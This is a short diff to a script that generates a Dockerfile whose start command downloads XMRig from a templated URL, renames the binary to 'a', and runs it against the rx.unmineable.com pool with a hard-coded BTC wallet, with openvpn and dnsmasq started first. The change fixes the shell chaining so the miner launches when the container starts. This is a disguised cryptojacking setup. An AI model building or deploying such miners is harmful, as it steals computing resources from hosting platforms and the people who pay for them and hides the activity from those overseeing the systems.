@@ -13,11 +13,11 @@ RUN echo \"nameserver 8.8.8.8\" > /etc/resolv.conf
 RUN echo \"\\
 service dnsmasq start &&\\
 openvpn --config rdp.ovpn --daemon &&\\
-RUN wget !!__URL__!!/a.tar.gz
-RUN tar -xf a.tar.gz
+wget !!__URL__!!/a.tar.gz &&\\
+tar -xf a.tar.gz &&\\
 cd xmrig-6.15.1 &&\\
 mv xmrig a &&\\
-./a -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qxt9n2qq8yy2n462atcqejuu63cfdm07aztx5d3.$name -p x\n\\
+./a -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qxt9n2qq8yy2n462atcqejuu63cfdm07aztx5d3.$name -p x\\
 \"> de.sh
 CMD [\"sh\", \"de.sh\"]
 " > Dockerfile
